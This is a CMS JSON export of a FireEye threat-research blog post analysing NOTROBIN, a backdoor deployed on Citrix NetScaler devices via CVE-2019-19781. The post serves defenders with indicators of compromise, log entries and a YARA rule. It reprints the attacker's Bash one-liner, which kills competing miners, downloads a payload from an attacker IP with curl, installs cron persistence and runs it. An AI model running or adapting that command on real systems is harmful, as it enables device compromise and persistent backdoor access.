{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "fireeye_global_admin",
  "jcr:created": "Fri Jan 17 2020 03:05:40 GMT+0000",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "fireeye_global_admin",
    "jcr:title": "404 Exploit Not Found: Vigilante Deploying Mitigation for Citrix NetScaler Vulnerability While Maintaining Backdoor",
    "jcr:versionHistory": "9eec0f2e-99dd-4cba-9cba-235dfa5779fb",
    "author": "William Ballenthin",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "9c0b00ad-0736-45cc-a5ec-c07fbc275cf4"
    ],
    "jcr:created": "Sat Jan 18 2020 21:38:02 GMT+0000",
    "cq:lastModified": "Sat Jan 18 2020 21:37:42 GMT+0000",
    "jcr:baseVersion": "9c0b00ad-0736-45cc-a5ec-c07fbc275cf4",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:cap-william-ballenthin",
      "fireeye-blog-authors:josh-madeley",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:incident-response",
      "fireeye-blog-tags:malware",
      "fireeye-blog-tags:vulnerabilities",
      "fireeye-blog-tags:FLARE",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:latest"
    ],
    "jcr:uuid": "513aec23-6235-4025-8e5a-74ca203ae18c",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Wed Jan 15 2020 22:00:00 GMT-0500",
    "cq:lastModifiedBy": "adam.greenberg@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
        "text": "\u003Cp\u003EAs noted in \u003Ca adhocenable=\u0022false\u0022 href=\u0022\/content\/fireeye-www\/en_US\/blog\/products-and-services\/2020\/01\/rough-patch-promise-it-will-be-200-ok.html\u0022\u003ERough Patch: I Promise It\u0027ll Be 200 OK\u003C\/a\u003E, our \u003Ca href=\u0022https:\/\/www.fireeye.com\/services.html\u0022\u003EFireEye Mandiant\u003C\/a\u003E Incident Response team has been hard at work responding to intrusions stemming from the exploitation of CVE-2019-19781. After analyzing dozens of successful exploitation attempts against Citrix ADCs that did not have the\u0026nbsp;\u003Ca href=\u0022https:\/\/support.citrix.com\/article\/CTX267679\u0022 title=\u0022https:\/\/support.citrix.com\/article\/CTX267679\u0022\u003ECitrix mitigation steps\u003C\/a\u003E\u0026nbsp;implemented, we\u2019ve recognized multiple groups of post-exploitation activity. Within these, something caught our eye: one particular threat actor that\u2019s been deploying a previously-unseen payload for which we\u2019ve created the code family NOTROBIN.\u003C\/p\u003E\n\u003Cp\u003EUpon gaining access to a vulnerable NetScaler device, this actor cleans up known malware and deploys NOTROBIN to block subsequent exploitation attempts! But all is not as it seems, as NOTROBIN maintains backdoor access for those who know a secret passphrase. FireEye believes that this actor may be quietly collecting access to NetScaler devices for a subsequent campaign.\u003C\/p\u003E\n\u003Ch4\u003EInitial Compromise\u003C\/h4\u003E\n\u003Cp\u003EThis actor exploits NetScaler devices using CVE-2019-19781 to execute shell commands on the compromised device. They issue an HTTP POST request from a Tor exit node to transmit the payload to the vulnerable \u003Cspan class=\u0022code\u0022\u003Enewbm.pl\u003C\/span\u003E CGI script. For example, Figure 1 shows a web server access log entry recording exploitation:\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E127.0.0.2 - - [12\/Jan\/2020:21:55:19 -0500] \u0026quot;POST\u003Cbr\u003E\n \/vpn\/..\/vpns\/portal\/scripts\/newbm.pl HTTP\/1.1\u0026quot; 304 - \u0026quot;-\u0026quot; \u0026quot;curl\/7.67.0\u0026quot;\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 1: Web log showing exploitation\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EUnlike other actors, this actor appears to exploit devices using a single HTTP POST request that results in an HTTP 304 response\u2014there is no observed HTTP GET to invoke staged commands. Unfortunately, we haven\u2019t recovered the POST body contents to see how it works. \u0026nbsp;In any case, exploitation causes the Bash one liner shown in Figure 2 to run on the compromised system:\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Epkill -9 netscalerd; rm \/var\/tmp\/netscalerd; mkdir \/tmp\/.init; curl -k\u003Cbr\u003E\n hxxps:\/\/95.179.163[.]186\/wp-content\/uploads\/2018\/09\/64d4c2d3ee56af4f4ca8171556d50faa -o\u003Cbr\u003E\n \/tmp\/.init\/httpd; chmod 744 \/tmp\/.init\/httpd; echo \u0026quot;* * * * *\u003Cbr\u003E\n \/var\/nstmp\/.nscache\/httpd\u0026quot; | crontab -; \/tmp\/.init\/httpd \u0026amp;\u0026quot;\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 2: Bash exploit payload\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThis is the same methodology as described in \u003Ca adhocenable=\u0022false\u0022 href=\u0022\/content\/fireeye-www\/en_US\/blog\/products-and-services\/2020\/01\/rough-patch-promise-it-will-be-200-ok.html\u0022\u003ERough Patch: I Promise It\u0027ll Be 200 OK\u003C\/a\u003E. The effects of this series of commands includes:\u003C\/p\u003E\n\u003Col\u003E\n\u003Cli\u003EKill and delete all running instances of \u003Cspan class=\u0022code\u0022\u003Enetscalerd\u003C\/span\u003E\u2014a common process name used for cryptocurrency mining utilities deployed to NetScaler devices.\u003C\/li\u003E\n\u003Cli\u003ECreates a hidden staging directory \u003Cspan class=\u0022code\u0022\u003E\/tmp\/.init\u003C\/span\u003E, download NOTROBIN to it, and enable the execute permission.\u003C\/li\u003E\n\u003Cli\u003EInstall \u003Cspan class=\u0022code\u0022\u003E\/var\/nstmp\/.nscache\/httpd\u003C\/span\u003E for persistence via the \u003Cspan class=\u0022code\u0022\u003Ecron\u003C\/span\u003E daemon. This is the path to which NOTROBIN will copy itself.\u003C\/li\u003E\n\u003Cli\u003EManually execute NOTROBIN.\u003C\/li\u003E\n\u003C\/ol\u003E\n\u003Cp\u003EThere\u2019s a lot to unpack here. Of note, the actor removes malware known to target NetScaler devices via the CVE-2019-19781 vulnerability. Cryptocurrency miners are generally easy to identify\u2014just look for the process utilizing nearly 100% of the CPU. By uninstalling these unwanted utilities, the actor may hope that administrators overlook an obvious compromise of their NetScaler devices.\u003C\/p\u003E\n\u003Cp\u003EThe actor uses \u003Cspan class=\u0022code\u0022\u003Ecurl\u003C\/span\u003E to fetch NOTROBIN from the hosting server with IP address \u003Cspan class=\u0022code\u0022\u003E95.179.163[.]186\u003C\/span\u003E that appears to be an abandoned WordPress site. FireEye has identified many payloads hosted on this server, each named after their embedded authentication key. Interestingly, we haven\u2019t seen reuse of the same payload across multiple clients. Compartmenting payloads indicates the actor is exercising operational security.\u003C\/p\u003E\n\u003Cp\u003EFireEye has recovered \u003Cspan class=\u0022code\u0022\u003Ecron\u003C\/span\u003E syslog entries, such as those shown in Figure 3, that confirm the persistent installation of NOTROBIN. Note that these entries appear just after the initial compromise. This is a robust indicator of compromise to triage NetScaler devices.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003EJan 12 21:57:00 \u0026lt;cron.info\u0026gt; foo.netscaler \/usr\/sbin\/cron[73531]:\u003Cbr\u003E\n (nobody) CMD (\/var\/nstmp\/.nscache\/httpd)\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: cron log entry showing NOTROBIN execution\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003ENow, let\u2019s turn our attention to what NOTROBIN does.\u003C\/p\u003E\n\u003Ch4\u003EAnalysis of NOTROBIN\u003C\/h4\u003E\n\u003Cp\u003ENOTROBIN is a utility written in Go 1.10 and compiled to a 64-bit ELF binary for BSD systems. It periodically scans for and deletes files matching filename patterns and content characteristics. The purpose seems to be to block exploitation attempts against the CVE-2019-19781 vulnerability; however, FireEye believes that NOTROBIN provides backdoor access to the compromised system.\u003C\/p\u003E\n\u003Cp\u003EWhen executed, NOTROBIN ensures that it is running from the path \u003Cspan class=\u0022code\u0022\u003E\/var\/nstmp\/.nscache\/httpd\u003C\/span\u003E. If not, the utility copies itself to this path, spawns the new copy, and then exits itself. This provides detection cover by migrating the process from \u003Cspan class=\u0022code\u0022\u003E\/tmp\/\u003C\/span\u003E, a suspicious place for long-running processes to execute, to an apparently NetScaler-related, hidden directory.\u003C\/p\u003E\n\u003Cp\u003ENow the fun begins: it spawns two routines that periodically check for and delete exploits.\u003C\/p\u003E\n\u003Cp\u003EEvery second, NOTROBIN searches the directory \u003Cspan class=\u0022code\u0022\u003E\/netscaler\/portal\/scripts\/\u003C\/span\u003E for entries created within the last 14 days and deletes them, unless the filename or file content contains a hardcoded key (example: \u003Cspan class=\u0022code\u0022\u003E64d4c2d3ee56af4f4ca8171556d50faa\u003C\/span\u003E). Open source reporting indicates that some actors write scripts into this directory after exploiting CVE-2019-19781. Therefore, we believe that this routine cleans the system of publicly known payloads, such as \u003Ca href=\u0022https:\/\/isc.sans.edu\/diary\/Citrix+ADC+Exploits+are+Public+and+Heavily+Used.+Attempts+to+Install+Backdoor\/25700\u0022\u003EPersonalBookmark.pl\u003C\/a\u003E.\u003C\/p\u003E\n\u003Cp\u003EEight times per second, NOTROBIN searches for files with an \u003Cspan class=\u0022code\u0022\u003E.xml\u003C\/span\u003E extension in the directory \u003Cspan class=\u0022code\u0022\u003E\/netscaler\/portal\/templates\/\u003C\/span\u003E. This is the directory into which exploits for CVE-2019-19781 write templates containing attacker commands. NOTROBIN deletes files that contain either of the strings \u003Cspan class=\u0022code\u0022\u003Eblock\u003C\/span\u003E or \u003Cspan class=\u0022code\u0022\u003EBLOCK\u003C\/span\u003E, which likely match potential exploit code, such as that found in the \u003Ca href=\u0022https:\/\/github.com\/projectzeroindia\/CVE-2019-19781\/blob\/master\/CVE-2019-19781.sh#L20\u0022\u003EProjectZeroIndia exploit\u003C\/a\u003E; however, the utility does not delete files with a filename containing the secret key.\u003C\/p\u003E\n\u003Cp\u003EFireEye believes that actors deploy NOTROBIN to block exploitation of the CVE-2019-19781 vulnerability while maintaining backdoor access to compromised NetScaler devices. The mitigation works by deleting staged exploit code found within NetScaler templates before it can be invoked. However, when the actor provides the hardcoded key during subsequent exploitation, NOTROBIN does \u003Ci\u003Enot\u003C\/i\u003E remove the payload. This lets the actor regain access to the vulnerable device at a later time.\u003C\/p\u003E\n\u003Cp\u003EAcross multiple investigations, FireEye observed actors deploying NOTROBIN with unique keys. For example, we\u2019ve recovered nearly 100 keys from different binaries. These look like MD5 hashes, though FireEye has been unsuccessful in recovering any plaintext. Using complex, unique keys makes it difficult for third parties, such as competing attackers or FireEye, to easily scan for NetScaler devices \u201cprotected\u201d by NOTROBIN. This actor follows a strong password policy!\u003C\/p\u003E\n\u003Cp\u003EBased on strings found within NOTROBIN, the actor appears to inject the key into the Go project using source code files named after the key. Figure 4 and Figure 5 show examples of these filenames.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\/tmp\/b\/.tmpl_ci\/64d4c2d3ee56af4f4ca8171556d50faa.go\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4: Source filename recovered from NOTROBIN sample\u003C\/span\u003E\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\/root\/backup\/sources\/d474a8de77902851f96a3b7aa2dcbb8e.go\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 5: Source filename recovered from NOTROBIN sample\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EWe wonder if \u201ctmpl_ci\u201d refers to a Continuous Integration setup that applies source code templating to inject keys and build NOTROBIN variants. We also hope the actor didn\u2019t have to revert to backups after losing the original source!\u003C\/p\u003E\n\u003Ch4\u003EOutstanding Questions\u003C\/h4\u003E\n\u003Cp\u003ENOTROBIN spawns a background routine that listens on UDP port 18634 and receives data; however, it drops the data without inspecting it. You can see this logic in Figure 6. FireEye has not uncovered a purpose for this behavior, though DCSO \u003Ca href=\u0022https:\/\/blog.dcso.de\/a-curious-case-of-cve-2019-19781-palware-remove_bds\/\u0022\u003Emakes a strong case\u003C\/a\u003E for this being used as a mutex, as only a single listener can be active on this port.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/citrix2\/Picture6.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 6: NOTROBIN logic that drops UDP traffic\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThere is also an empty function \u003Cspan class=\u0022code\u0022\u003Emain.install_cron\u003C\/span\u003E whose implementation has been removed, so alternatively, perhaps these are vestiges of an early version of NOTROBIN. In any case, a NetScaler device listening on UDP port 18634 is a reliable indicator of compromise. Figure 7 shows an example of listing the open file handles on a compromised NetScaler device, including a port listening on UDP 18634.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/citrix2\/Picture7.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 7: File handling listing of compromised NetScaler device\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003ENOTROBIN Efficacy\u003C\/h4\u003E\n\u003Cp\u003EDuring one engagement, FireEye reviewed forensic evidence of NetScaler exploitation attempts against a single device, both before and after NOTROBIN was deployed by an actor. Prior to January 12, before NOTROBIN was installed, we identified successful attacks from multiple actors. But, across the following three days, more than a dozen exploitation attempts were thwarted by NOTROBIN. In other words, NOTROBIN inoculated the vulnerable device from further compromise. For example, Figure 8 shows a log message that records a failed exploitation attempt.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E127.0.0.2 - - [13\/Jan\/2020:05:09:07 -0500] \u0026quot;GET\u003Cbr\u003E\n \/vpn\/..\/vpns\/portal\/wTyaINaDVPaw8rmh.xml HTTP\/1.1\u0026quot; 404 48 \u0026quot;-\u0026quot;\u003Cbr\u003E\n \u0026quot;curl\/7.47.0\u0026quot;\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 8: Web log entry showing a failed exploitation attempt\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003ENote that the application server responded with HTTP 404 (\u201cNot Found\u201d) as this actor attempts to invoke their payload staged in the template \u003Cspan class=\u0022code\u0022\u003EwTyaINaDVPaw8rmh.xml\u003C\/span\u003E. NOTROBIN deleted the malicious template shortly after it was created \u2013 and before it could be used by the other actor.\u003C\/p\u003E\n\u003Cp\u003EFireEye has not yet identified if the actor has returned to NOTROBIN backdoors.\u003C\/p\u003E\n\u003Ch4\u003EConclusion\u003C\/h4\u003E\n\u003Cp\u003EFireEye believes that the actor behind NOTROBIN has been opportunistically compromising NetScaler devices, possibly to prepare for an upcoming campaign. They remove other known malware, potentially to avoid detection by administrators that check into their devices after reading Citrix security bulletin \u003Ca href=\u0022https:\/\/support.citrix.com\/article\/CTX267027\u0022\u003ECTX267027\u003C\/a\u003E. NOTROBIN mitigates CVE-2019-19781 on compromised devices but retains a backdoor for an actor with a secret key. While we haven\u2019t seen the actor return, we\u2019re skeptical that they will remain a Robin Hood character protecting the internet from the shadows.\u003C\/p\u003E\n\u003Ch4\u003EIndicators of Compromise and Discovery\u003C\/h4\u003E\n\u003Cp\u003ETable 1 lists indicators that match NOTROBIN variants that FireEye has identified. The domain \u003Cspan class=\u0022code\u0022\u003Evilarunners[.]cat\u003C\/span\u003E is the WordPress site that hosted NOTROBIN payloads. The domain resolved to \u003Cspan class=\u0022code\u0022\u003E95.179.163[.]186\u003C\/span\u003E during the time of observed activity. As of January 15, the \u003Cspan class=\u0022code\u0022\u003Evilarunners[.]cat domain\u003C\/span\u003E currently resolves to a new IP address of \u003Cspan class=\u0022code\u0022\u003E80.240.31[.]218\u003C\/span\u003E.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022138\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EIOC Item\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022472\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EValue\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022138\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EHTTP URL prefix\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022472\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ehxxps:\/\/95[.]179.163.186\/wp-content\/uploads\/2018\/09\/\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022138\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDirectory\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022472\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\/var\/nstmp\/.nscache\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022138\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFilename\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022472\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\/var\/nstmp\/.nscache\/httpd\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022138\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDirectory\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022472\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\/tmp\/.init\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022138\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFilename\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022472\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\/tmp\/.init\/httpd\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022138\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ECrontab entry\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022472\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\/var\/nstmp\/.nscache\/httpd\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022138\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EListening UDP port\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022472\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E18634\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022138\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ERemote IP\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022472\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E95.179.163[.]186\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022138\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ERemote IP\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022472\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E80.240.31[.]218\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022138\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDomain\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022472\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Evilarunners[.]cat\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 1: Indicators of Compromise\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EDiscovery on VirusTotal\u003C\/h4\u003E\n\u003Cp\u003EYou can use the following VTI queries to identify NOTROBIN variants on VirusTotal:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Evhash:\u0026quot;73cee1e8e1c3265c8f836516c53ae042\u0026quot;\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Evhash:\u0026quot;e57a7713cdf89a2f72c6526549d22987\u0026quot;\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003ENote, the vHash implementation is private, so we\u2019re not able to confirm why this technique works. In practice, the vHashes cover the same variants identified by the Yara rule listed in Figure 9.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Erule NOTROBIN\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E{\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; meta:\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; author = \u0026quot;william.ballenthin@fireeye.com\u0026quot;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; date_created = \u0026quot;2020-01-15\u0026quot;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; strings:\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $func_name_1 = \u0026quot;main.remove_bds\u0026quot;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $func_name_2 = \u0026quot;main.xrun\u0026quot;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; condition:\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; all of them\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E}\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 9: Yara rule that matches on NOTROBIN variants\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003ERecovered Authentication Keys\u003C\/h4\u003E\n\u003Cp\u003EFireEye has identified nearly 100 hardcoded keys from NOTROBIN variants that the actor could use to re-enter compromised environments. We expect that these strings may be found within subsequent exploitation attempts, either as filenames or payload content. Although we won\u2019t publish them here out of concern for our customers, please reach out if you\u2019re looking for NOTROBIN within your environment and we can provide a list.\u003C\/p\u003E\n\u003Ch4\u003EAcknowledgements\u003C\/h4\u003E\n\u003Cp\u003EThank you to analysts across FireEye that are currently responding to this activity, including \u003Ca href=\u0022https:\/\/twitter.com\/4real_br4nd4n\u0022\u003EBrandan Schondorfer\u003C\/a\u003E for collecting and interpreting artifacts, \u003Ca href=\u0022https:\/\/twitter.com\/stvemillertime\u0022\u003ESteven Miller\u003C\/a\u003E for coordinating analysis, \u003Ca href=\u0022https:\/\/twitter.com\/reesespcres\u0022\u003EEvan Reese\u003C\/a\u003E for pivoting across intel leads, \u003Ca href=\u0022https:\/\/twitter.com\/cglyer\u0022\u003EChris Glyer\u003C\/a\u003E for reviewing technical aspects, \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/twitter.com\/m_r_tz\u0022\u003EMoritz Raabe\u003C\/a\u003E for reverse engineering NOTROBIN samples, and \u003Ca href=\u0022https:\/\/twitter.com\/HighViscosity\u0022\u003EAshley Frazer\u003C\/a\u003E for refining the presentation and conclusions.\u003C\/p\u003E\n",
        "jcr:lastModified": "Sat Jan 18 2020 21:37:42 GMT+0000",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003EAn actor is blocking the ability to exploit a Citrix vulnerability, but maintaining a backdoor.\u003C\/p\u003E\n",
      "jcr:lastModified": "Fri Jan 17 2020 02:27:05 GMT+0000",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "jcr:lastModified": "Fri Jan 17 2020 14:23:50 GMT+0000",
      "imageRotate": "0"
    }
  }
}
